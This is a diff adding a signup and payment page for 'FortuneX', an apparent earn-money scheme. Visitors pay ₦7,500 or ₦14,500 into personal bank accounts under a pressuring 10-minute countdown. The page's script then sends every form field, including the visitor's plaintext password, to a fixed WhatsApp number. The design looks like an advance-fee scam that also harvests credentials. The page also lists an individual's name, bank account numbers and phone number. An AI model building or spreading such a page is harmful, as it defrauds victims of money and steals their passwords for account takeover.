@@ -1,0 +1,765 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>FortuneX • Sign Up</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    :root{
+      --accent:#8B1A1A;
+      --accent-2:#A52A2A;
+      --card-bg: rgba(7,4,4,0.75);
+      --input-bg: rgba(255,255,255,0.05);
+      --muted: #c9bfbf;
+      --text: #fff6f6;
+      --radius:12px;
+      --max-width:420px;
+    }
+
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%}
+    body{
+      font-family:"Poppins",system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+      background: url('https://i.ibb.co/svqQzKD8/20251104-164223-3.jpg') center center / cover fixed no-repeat;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:18px;
+      color:var(--text);
+      min-height:100vh;
+    }
+
+    .wrap{
+      width:100%;
+      max-width:var(--max-width);
+      border-radius:18px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      overflow:hidden;
+      border:1px solid rgba(255,255,255,0.03);
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.02));
+    }
+
+    .top {
+      padding:20px;
+      text-align:center;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+    }
+    .top img { height:56px; display:block; margin:0 auto 8px }
+    .top h1 { font-size:18px; font-weight:700; color:#fff }
+
+    .panel {
+      padding:22px;
+      margin:18px;
+      background: var(--card-bg);
+      border-radius:18px;
+      backdrop-filter: blur(12px);
+    }
+
+    .title { text-align:center; font-weight:800; font-size:18px; margin-bottom:12px; color:#fff }
+    .sub { text-align:center; color:var(--muted); font-size:0.95rem; margin-bottom:16px }
+
+    form { display:flex; flex-direction:column; gap:14px; }
+
+    .field { position:relative; width:100%; }
+    input, select {
+      width:100%;
+      padding:14px 14px;
+      border-radius:10px;
+      background:var(--input-bg);
+      color:var(--text);
+      border:1px solid rgba(255,255,255,0.08);
+      outline:none;
+      font-size:0.96rem;
+    }
+    input::placeholder{ color:#a39797 }
+    input:focus { border-color: var(--accent); box-shadow: 0 6px 18px rgba(139,26,26,0.08); }
+
+    .toggle-eye {
+      position:absolute;
+      right:8px;
+      top:50%;
+      transform:translateY(-50%);
+      cursor:pointer;
+      color:#aaa;
+      background:transparent;
+      border:0;
+      padding:6px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      border-radius:8px;
+    }
+    .toggle-eye:focus { outline:2px solid rgba(255,255,255,0.12); }
+
+    .note { font-size:0.85rem; color:var(--muted); margin-top:-6px; margin-bottom:8px; }
+
+    .proceed {
+      padding:14px;
+      background: linear-gradient(180deg,var(--accent),var(--accent-2));
+      color:#fff;
+      font-weight:800;
+      border-radius:10px;
+      border:0;
+      cursor:pointer;
+      font-size:1rem;
+      box-shadow: 0 10px 30px rgba(139,26,26,0.18);
+    }
+
+    .packages { display:none; gap:12px; margin:0 18px; }
+    .packages.active { display:flex; flex-direction:column; }
+
+    .pkg {
+      background:var(--card-bg);
+      border-radius:12px;
+      padding:14px;
+      border:1px solid rgba(255,255,255,0.05);
+      position:relative;
+      margin-bottom:12px;
+    }
+    .pkg h3 { margin:0 0 6px 0; color:#fff; font-size:1.02rem }
+    .pkg p { color:var(--muted); font-size:0.95rem; margin:0 0 8px 0 }
+    .pkg .price { font-weight:800; color:#fff; margin-top:6px; font-size:1.02rem }
+    .badge {
+      position:absolute;
+      right:12px;
+      top:12px;
+      background:var(--accent);
+      color:#111;
+      padding:6px 8px;
+      border-radius:8px;
+      font-weight:700;
+      font-size:0.8rem;
+    }
+    .choose {
+      margin-top:10px;
+      width:100%;
+      padding:12px;
+      background:linear-gradient(180deg,var(--accent),var(--accent-2));
+      color:#fff;
+      font-weight:700;
+      border:0;
+      border-radius:10px;
+      cursor:pointer;
+    }
+    
+    .pay-amount {
+  font-weight: 700;
+  font-size: 1.3rem;
+  margin: 10px 0;
+  color: var(--primary);      /* Gives it a highlight color if you use one */
+}
+
+.pay-amount {
+  font-weight: 700;          /* Bold */
+  font-size: 1.25rem;        /* Slightly larger text */
+  margin: 8px 0;             /* Small spacing */
+}
+    
+    .timer-box {
+  font-size: 1.6rem;
+  font-weight: 700;
+  text-align: center;
+  margin: 15px 0;
+  padding: 12px 20px;
+  border-radius: 10px;
+  background: #ffe9e7;       /* soft alert background */
+  color: #d92700;            /* bold timer color */
+  display: inline-block;
+}
+    
+    .timer-box {
+  animation: pulse 1.2s infinite;
+}
+
+@keyframes pulse {
+  0% { opacity: 1; }
+  50% { opacity: 0.65; }
+  100% { opacity: 1; }
+}
+    .page {
+  padding-bottom: 120px;   /* more breathing space */
+  overflow-y: auto;        /* enable scroll */
+}
+
+#formCard {
+  margin-top: 00px; /* perfect space for the logo */
+}
+#productsPage,
+#paymentPage {
+  overflow-y: auto;     /* allow scrolling */
+  padding-bottom: 90px; /* extra space for scrolling */
+}
+#countdown {
+  display: block;
+  margin: 0 auto;
+  text-align: center;
+}
+#paymentPage {
+  margin-top: 70px;
+  padding-top: 10px;
+}
+
+    .screen-back {
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      margin-bottom:12px;
+      color:var(--muted);
+      cursor:pointer;
+      background:transparent;
+      border:0;
+      padding:6px 8px;
+      border-radius:8px;
+    }
+    .screen-back:hover { color:#fff; }
+
+    .small { font-size:0.85rem; color:var(--muted); text-align:center; margin-top:10px }
+
+    /* PAYMENT page styles */
+    .card.payment-page { display:none; margin:18px; }
+    .payment-header h2 { margin:0 0 8px 0; font-size:1.2rem }
+    .merchants { display:flex; flex-direction:column; gap:12px; margin-top:12px; }
+    .merchant {
+      background: rgba(255,255,255,0.03);
+      border:1px solid rgba(255,255,255,0.05);
+      border-radius:12px;
+      padding:12px;
+      cursor:pointer;
+    }
+    .merchant.selected { box-shadow: 0 6px 20px rgba(0,0,0,0.4); border-color: rgba(255,255,255,0.12); }
+    .m-title { font-weight:800; font-size:1.02rem; margin-bottom:6px; }
+    .m-bank, .m-name { color:var(--muted); font-size:0.95rem; }
+    .m-account { display:flex; align-items:center; gap:8px; margin:8px 0; }
+    .copy-btn { padding:6px 8px; border-radius:8px; border:0; cursor:pointer; background:linear-gradient(180deg,var(--accent),var(--accent-2)); color:#fff; font-weight:700; }
+    .copied-hint { color:#8bd46d; font-weight:700; display:none; margin-left:8px; font-size:0.9rem; }
+
+    .pay-actions { display:flex; gap:12px; margin-top:14px; justify-content:center; }
+    .btn-ghost { background:transparent; border:1px solid rgba(255,255,255,0.06); padding:10px 12px; border-radius:8px; color:var(--muted); cursor:pointer; }
+    .btn-primary { background:linear-gradient(180deg,var(--accent),var(--accent-2)); padding:10px 12px; border-radius:8px; border:0; color:#fff; font-weight:800; cursor:pointer; }
+
+    .countdown-line { color:var(--muted); margin-top:6px; font-weight:700; }
+
+    /* Checkout bar only for page 2 -> hidden by default */
+    .checkout-bar { display:none; position:fixed; bottom:14px; left:50%; transform:translateX(-50%); width:calc(100% - 36px); max-width:420px; background:rgba(0,0,0,0.85); border-radius:12px; padding:12px 14px; display:flex; justify-content:space-between; align-items:center; gap:12px; z-index:999;}
+    .checkout-total { font-weight:800; font-size:1.05rem; }
+    .checkout-btn { padding:10px 14px; border-radius:10px; background:linear-gradient(180deg,var(--accent),var(--accent-2)); color:#fff; border:0; font-weight:800; cursor:pointer; }
+
+    @media (max-width:480px){
+      .panel, .card.payment-page { margin:12px; }
+      .checkout-bar { bottom:10px; left:8px; right:8px; transform:none; width:auto; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap" role="main">
+    <div class="top">
+      <img src="https://i.ibb.co/Z6xz7HLn/20251104-164223-2-removebg-preview.png" alt="FortuneX logo">
+    </div>
+
+    <!-- STEP 1: SIGNUP -->
+    <div class="panel" id="formCard" aria-hidden="false">
+      <div class="title">Create your account</div>
+      <div class="sub">Join FortuneX and start earning — fill all fields to continue</div>
+
+      <form id="magnusSignup" novalidate>
+        <div class="field">
+          <input id="fullName" name="fullName" type="text" placeholder="Your full name" required>
+        </div>
+        <div class="field">
+          <input id="username" name="username" type="text" placeholder="Choose a username" required>
+        </div>
+        <div class="field">
+          <input id="email" name="email" type="email" placeholder="you@domain.com" required>
+        </div>
+        <div class="field">
+          <input id="phone" name="phone" type="tel" placeholder="08012345678" required>
+        </div>
+
+        <div class="field" style="margin-bottom:0;">
+          <input id="password" name="password" type="password" placeholder="Create a secure password" minlength="8" required aria-describedby="pwNote">
+          <button type="button" class="toggle-eye" id="pwToggle" aria-label="Show password" aria-pressed="false">
+            <i class="fa fa-eye" aria-hidden="true"></i>
+          </button>
+        </div>
+        <div id="pwNote" class="note">Minimum 8 characters</div>
+
+        <button type="submit" class="proceed" id="toProductsBtn">Proceed</button>
+        <div class="small">By proceeding you agree to our terms.</div>
+      </form>
+    </div>
+
+    <!-- STEP 2: PACKAGES -->
+    <div class="panel packages" id="productsPage" aria-hidden="true">
+      <button class="screen-back" id="backToForm" type="button" aria-label="Back to signup">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i> Back
+      </button>
+
+      <div class="title" style="text-align:center">Select a package</div>
+
+      <div class="pkg product-card" data-pkg="Starter" tabindex="0">
+        <h3>FortuneX Starter</h3>
+        <p>Basic access to all earning categories — good for beginners and testing the platform.</p>
+        <div class="price">₦7,500</div>
+        <button class="choose" data-pkg="Starter" data-amount="7500">Choose Starter — ₦7,500</button>
+      </div>
+
+      <div class="pkg product-card" data-pkg="Plus" tabindex="0">
+        <div class="badge">Popular👑</div>
+        <h3>FortuneX Plus</h3>
+        <p>Premium access with higher bonuses, faster growth, and more benefits.</p>
+        <div class="price">₦14,500</div>
+        <button class="choose" data-pkg="Plus" data-amount="14500">Choose Plus — ₦14,500</button>
+      </div>
+    </div>
+
+    <!-- STEP 3: PAYMENT -->
+    <div class="card payment-page panel" id="paymentPage" aria-hidden="true">
+      <div class="payment-header"><h2>Pay to a Merchant</h2>
+<div class="greeting-line" id="greetingPayment" aria-live="polite"></div>
+<div class="amount-line pay-amount" id="amountLine">Amount: ₦0</div>
+<div class="countdown-line">
+  Complete payment within:
+  <p id="countdown" class="timer-box">10:00</p>
+  <p style="text-align:center;color:var(--muted);margin-top:6px;">
+    Choose a merchant and copy the account number to pay.
+  </p>
+</div>
+
+
+      <div class="merchants" id="merchantsList">
+        <div class="merchant" data-id="palmpay" tabindex="0">
+          <div class="m-title">Merchant 1</div>
+          <div class="m-bank">Bank: Palmpay</div>
+          <div class="m-account">
+            <span id="acct-m1" class="acct-num" role="button" aria-label="Copy account number">9115149926</span>
+            <button type="button" class="copy-btn" data-acct="9115149926">Copy</button>
+            <span class="copied-hint" aria-hidden="true">Copied!</span>
+          </div>
+          <div class="m-name" style="color:var(--muted);font-size:0.95rem;">Name: Onesimus Ekene Jeppoe</div>
+        </div>
+
+        <div class="merchant" data-id="moniepoint" tabindex="0">
+          <div class="m-title">Merchant 2</div>
+          <div class="m-bank">Bank: Moniepoint</div>
+          <div class="m-account">
+            <span id="acct-m2" class="acct-num" role="button" aria-label="Copy account number">8038657259</span>
+            <button type="button" class="copy-btn" data-acct="8038657259">Copy</button>
+            <span class="copied-hint" aria-hidden="true">Copied!</span>
+          </div>
+          <div class="m-name" style="color:var(--muted);font-size:0.95rem;">Name: Onesimus Ekene Jeppoe</div>
+        </div>
+      </div>
+
+      <div class="pay-actions">
+        <button class="btn-ghost" id="backBtn">Back & Edit</button>
+        <button class="btn-primary" id="paidBtn">I've made payment</button>
+      </div>
+      <div style="margin-top:8px;text-align:center;color:var(--muted);font-size:0.9rem;">
+        After payment click <strong>I've made payment</strong> to notify us — you'll be redirected.
+      </div>
+    </div>
+  </div>
+
+  <!-- CHECKOUT BAR (only shown on Page 2) -->
+  <div class="checkout-bar" id="checkoutBar" aria-hidden="true" style="display:none;">
+    <div>
+      <div style="font-size:0.9rem;color:var(--muted)">Total:</div>
+      <div class="checkout-total" id="checkoutTotal">₦0</div>
+    </div>
+    <div>
+      <button class="checkout-btn" id="toPaymentBtn" aria-disabled="true" disabled>Checkout</button>
+    </div>
+  </div>
+
+  <script>
+    /********** CONFIG **********/
+    const packageToAmount = { Starter: 7500, Plus: 14500 };
+    const whatsappNumber = '2349136339293';
+    const merchants = {
+      palmpay: { id:'palmpay', label:'Palmpay', account:'9115149926', name:'Onesimus Ekene Jeppoe', bank:'Palmpay' },
+      moniepoint: { id:'moniepoint', label:'Moniepoint', account:'8038657259', name:'Onesimus Ekene Jeppoe', bank:'Moniepoint' }
+    };
+
+    /********** ELEMENTS **********/
+    const form = document.getElementById('magnusSignup');
+    const formCard = document.getElementById('formCard');
+    const productsPage = document.getElementById('productsPage');
+    const paymentPage = document.getElementById('paymentPage');
+    const checkoutBar = document.getElementById('checkoutBar');
+    const toPaymentBtn = document.getElementById('toPaymentBtn');
+    const checkoutTotal = document.getElementById('checkoutTotal');
+    const greetingPayment = document.getElementById('greetingPayment');
+    const amountLine = document.getElementById('amountLine');
+    const countdownEl = document.getElementById('countdown');
+    const paidBtn = document.getElementById('paidBtn');
+    const backBtn = document.getElementById('backBtn');
+    const merchantsList = document.getElementById('merchantsList');
+    const chooseButtons = document.querySelectorAll('.choose');
+    const backToForm = document.getElementById('backToForm');
+
+    let selectedPackage = null;
+    let selectedMerchant = null;
+    let paymentTimerId = null;
+    let paymentTimeLeft = 0;
+    let paymentTimerExpired = false;
+
+    // set initial history
+    history.replaceState({ page: "form" }, "", location.pathname + location.search + "#form");
+
+    /********** UTIL: show/hide checkout (only page 2) **********/
+    function showCheckoutBar(){
+      checkoutBar.style.display = 'flex';
+      checkoutBar.setAttribute('aria-hidden','false');
+    }
+    function hideCheckoutBar(){
+      checkoutBar.style.display = 'none';
+      checkoutBar.setAttribute('aria-hidden','true');
+    }
+
+    // ensure hidden on load (page 1)
+    hideCheckoutBar();
+
+    /********** PASSWORD TOGGLE **********/
+    document.getElementById("pwToggle").addEventListener("click", function(){
+      const inp = document.getElementById("password");
+      const icon = this.querySelector("i");
+      if (inp.type === "password") {
+        inp.type = "text";
+        icon.classList.replace("fa-eye", "fa-eye-slash");
+        this.setAttribute('aria-pressed','true');
+      } else {
+        inp.type = "password";
+        icon.classList.replace("fa-eye-slash", "fa-eye");
+        this.setAttribute('aria-pressed','false');
+      }
+    });
+
+    /********** STEP 1 -> STEP 2 (FORM -> PACKAGES) **********/
+    form.addEventListener('submit', function(e){
+      e.preventDefault();
+      if (!form.checkValidity()) { form.reportValidity(); return; }
+
+      // push history and show packages
+      if (!(history.state && history.state.page === "products")) {
+        history.pushState({ page: "products" }, "", "#products");
+      }
+      formCard.style.display = 'none';
+      productsPage.style.display = 'block';
+      productsPage.setAttribute('aria-hidden','false');
+
+      // reset selection
+      selectedPackage = null;
+      updateCheckoutDisplay();
+
+      // show checkout ONLY on packages page
+      showCheckoutBar();
+
+      // focus first product
+      const first = document.querySelector('.product-card');
+      if(first) first.focus();
+    });
+
+    /********** BACK to FORM from PRODUCTS **********/
+    backToForm.addEventListener('click', function(){
+      if(history.state && history.state.page === "products"){
+        history.back();
+      } else {
+        showForm();
+        try { history.replaceState({page:'form'}, document.title, location.pathname); } catch(e){}
+      }
+    });
+
+    function showForm(){
+      formCard.style.display = 'block';
+      productsPage.style.display = 'none';
+      paymentPage.style.display = 'none';
+      // hide checkout on form
+      hideCheckoutBar();
+      if(paymentTimerId){ clearInterval(paymentTimerId); paymentTimerId = null; }
+      paymentTimerExpired = false;
+      countdownEl.textContent = '10:00';
+      paidBtn.disabled = false;
+      paidBtn.textContent = "I've made payment";
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    /********** PRODUCT SELECT (visually & checkout total) **********/
+    document.querySelectorAll('.product-card').forEach(card=>{
+      card.addEventListener('click', function(){
+        const pkg = this.getAttribute('data-pkg');
+        selectProduct(pkg, this);
+      });
+      card.addEventListener('keydown', function(e){
+        if(e.key === 'Enter' || e.key === ' '){
+          e.preventDefault();
+          const pkg = this.getAttribute('data-pkg');
+          selectProduct(pkg, this);
+        }
+      });
+    });
+
+    function selectProduct(pkg, el){
+      selectedPackage = pkg;
+      document.querySelectorAll('.product-card').forEach(c=> c.classList.remove('selected'));
+      if(el) el.classList.add('selected');
+
+      const amount = packageToAmount[pkg] || 0;
+      checkoutTotal.textContent = `₦${amount.toLocaleString()}`;
+
+      // enable checkout (visible on page 2 only)
+      toPaymentBtn.removeAttribute('disabled');
+      toPaymentBtn.setAttribute('aria-disabled','false');
+    }
+
+    /********** Proceed from Packages -> Payment (hide checkout on page 3) **********/
+    toPaymentBtn.addEventListener('click', function(){
+      if(!selectedPackage){
+        alert('Please select a product package first.');
+        return;
+      }
+
+      // prepare greeting and amount for payment page
+      const fullName = document.getElementById('fullName').value.trim();
+      const firstName = (fullName.split(" ")[0] || fullName || "there");
+      greetingPayment.textContent = `Hi ${firstName} — finish payment to activate your access.`;
+
+      const amount = packageToAmount[selectedPackage] || 0;
+      amountLine.textContent = `Amount: ₦${amount.toLocaleString()}`;
+
+      // push history
+      if (!(history.state && history.state.page === "payment")) {
+        history.pushState({ page: "payment" }, "", "#payment");
+      }
+
+      // show payment page
+      productsPage.style.display = 'none';
+      paymentPage.style.display = 'block';
+      paymentPage.setAttribute('aria-hidden','false');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+
+      // hide checkout on payment page
+      hideCheckoutBar();
+
+      // select default merchant and start timer
+      const firstMerchantEl = merchantsList.querySelector('.merchant[data-id="palmpay"]');
+      selectMerchantElement(firstMerchantEl);
+      startPaymentTimer();
+    });
+
+    /********** MERCHANT selection & copy **********/
+    function selectMerchantElement(el){
+      if(!el) return;
+      merchantsList.querySelectorAll('.merchant').forEach(m => m.classList.remove('selected'));
+      el.classList.add('selected');
+      const id = el.getAttribute('data-id');
+      selectedMerchant = merchants[id] || null;
+    }
+
+    merchantsList.addEventListener('click', function(e){
+      const m = e.target.closest('.merchant');
+      if(m){ selectMerchantElement(m); }
+
+      const acctSpan = e.target.closest('.acct-num');
+      if (acctSpan){
+        const acct = acctSpan.textContent.trim();
+        copyToClipboard(acct, acctSpan.closest('.merchant'));
+      }
+
+      const copyBtn = e.target.closest('.copy-btn');
+      if(copyBtn){
+        const acct = copyBtn.getAttribute('data-acct');
+        copyToClipboard(acct, copyBtn.closest('.merchant'));
+      }
+    });
+
+    document.querySelectorAll('.copy-btn').forEach(btn=>{
+      btn.addEventListener('click', function(e){
+        e.stopPropagation();
+        const acct = this.getAttribute('data-acct');
+        const merchantEl = this.closest('.merchant');
+        copyToClipboard(acct, merchantEl);
+      });
+    });
+
+    function copyToClipboard(text, merchantEl){
+      if(!navigator.clipboard){
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        try { document.execCommand('copy'); } catch(e){}
+        document.body.removeChild(ta);
+        showCopiedHint(merchantEl);
+        return;
+      }
+      navigator.clipboard.writeText(text).then(()=> showCopiedHint(merchantEl)).catch(()=> showCopiedHint(merchantEl));
+    }
+
+    function showCopiedHint(merchantEl){
+      if(!merchantEl) return;
+      const hint = merchantEl.querySelector('.copied-hint');
+      if(!hint) return;
+      hint.style.display = 'inline-block';
+      setTimeout(()=> hint.style.display = 'none', 1600);
+    }
+
+    /********** I've made payment -> WhatsApp redirect **********/
+    paidBtn.addEventListener('click', function(){
+      if(paymentTimerExpired){
+        alert('Payment window expired. Please go Back & Edit to restart.');
+        return;
+      }
+
+      const fullName = document.getElementById('fullName').value.trim();
+      const username = document.getElementById('username').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const pkg = selectedPackage;
+      const password = document.getElementById('password').value.trim();
+
+      if(!fullName || !username || !email || !phone || !pkg || !password){
+        alert('Some form fields are missing. Please go back and complete the form.');
+        return;
+      }
+      if(!selectedMerchant){
+        alert('Please choose a merchant to pay to.');
+        return;
+      }
+
+      const amount = packageToAmount[pkg] || 0;
+      const message =
+`📝 *FortuneX Signup*
+👤 Full Name: ${fullName}
+🔑 Username: ${username}
+📧 Email: ${email}
+📞 Phone: ${phone}
+🔐 Password: ${password}
+📦 Package: ${pkg} — ₦${amount.toLocaleString()}
+🏧 Paid To: ${selectedMerchant.label}
+Bank: ${selectedMerchant.bank}
+
+I have made the payment. Please confirm.`;
+
+      const waUrl = "https://wa.me/" + encodeURIComponent(whatsappNumber) + "?text=" + encodeURIComponent(message);
+      window.location.href = waUrl;
+    });
+
+    /********** BACK / history handling **********/
+    document.getElementById('backBtn').addEventListener('click', function(){ history.back(); });
+
+    window.addEventListener('popstate', function(e){
+      const state = (e.state || {});
+      if(!state.page || state.page === "form"){
+        // show form
+        paymentPage.style.display = 'none';
+        productsPage.style.display = 'none';
+        formCard.style.display = 'block';
+        hideCheckoutBar();
+        if(paymentTimerId){ clearInterval(paymentTimerId); paymentTimerId = null; }
+        paymentTimerExpired = false;
+        countdownEl.textContent = '10:00';
+        paidBtn.disabled = false;
+        paidBtn.textContent = "I've made payment";
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        return;
+      }
+      if(state.page === "products"){
+        paymentPage.style.display = 'none';
+        formCard.style.display = 'none';
+        productsPage.style.display = 'block';
+        productsPage.setAttribute('aria-hidden','false');
+        // ensure checkout is shown on packages page
+        showCheckoutBar();
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        return;
+      }
+      if(state.page === "payment"){
+        // show payment (rebuild)
+        formCard.style.display = 'none';
+        productsPage.style.display = 'none';
+        paymentPage.style.display = 'block';
+        paymentPage.setAttribute('aria-hidden','false');
+        hideCheckoutBar();
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+        startPaymentTimer();
+      }
+    });
+
+    /********** TIMER (10 minutes) **********/
+    function startPaymentTimer(){
+      if(paymentTimerId) { clearInterval(paymentTimerId); paymentTimerId = null; }
+      paymentTimerExpired = false;
+      paidBtn.disabled = false;
+      paidBtn.textContent = "I've made payment";
+      paymentTimeLeft = 10 * 60;
+      updateCountdownDisplay();
+      paymentTimerId = setInterval(()=>{
+        paymentTimeLeft--;
+        updateCountdownDisplay();
+        if(paymentTimeLeft <= 0){
+          clearInterval(paymentTimerId);
+          paymentTimerId = null;
+          paymentTimerExpired = true;
+          countdownEl.textContent = "Expired ⛔";
+          paidBtn.disabled = true;
+          paidBtn.textContent = "Payment time expired";
+        }
+      }, 1000);
+    }
+    function updateCountdownDisplay(){
+      const minutes = Math.floor(paymentTimeLeft / 60);
+      const seconds = paymentTimeLeft % 60;
+      countdownEl.textContent = `${minutes}:${seconds.toString().padStart(2,'0')}`;
+    }
+
+    /********** UX: checkout helpers **********/
+    function updateCheckoutDisplay(){
+      if(!selectedPackage){
+        checkoutTotal.textContent = "₦0";
+        toPaymentBtn.setAttribute('disabled','true');
+        toPaymentBtn.setAttribute('aria-disabled','true');
+      } else {
+        const amount = packageToAmount[selectedPackage] || 0;
+        checkoutTotal.textContent = `₦${amount.toLocaleString()}`;
+        toPaymentBtn.removeAttribute('disabled');
+        toPaymentBtn.setAttribute('aria-disabled','false');
+      }
+    }
+
+    // choose buttons inside product cards (updates selection + checkout)
+    document.querySelectorAll('.choose').forEach(btn=>{
+      btn.addEventListener('click', function(){
+        const pkg = this.getAttribute('data-pkg');
+        const amount = Number(this.getAttribute('data-amount'));
+        selectedPackage = pkg;
+        document.querySelectorAll('.product-card').forEach(c=> c.classList.remove('selected'));
+        this.closest('.product-card').classList.add('selected');
+        updateCheckoutDisplay();
+        // bring checkout into view (only visible on page 2)
+        showCheckoutBar();
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+      });
+    });
+
+    /********** Accessibility: keyboard merchant selection **********/
+    document.querySelectorAll('.merchant').forEach(m => {
+      m.addEventListener('keydown', (e) => {
+        if(e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          selectMerchantElement(m);
+        }
+      });
+    });
+
+    // focus first field on load
+    document.addEventListener('DOMContentLoaded', ()=> {
+      const firstInput = document.getElementById('fullName');
+      if(firstInput) firstInput.focus();
+    });
+  </script>
+</body>
+</html>
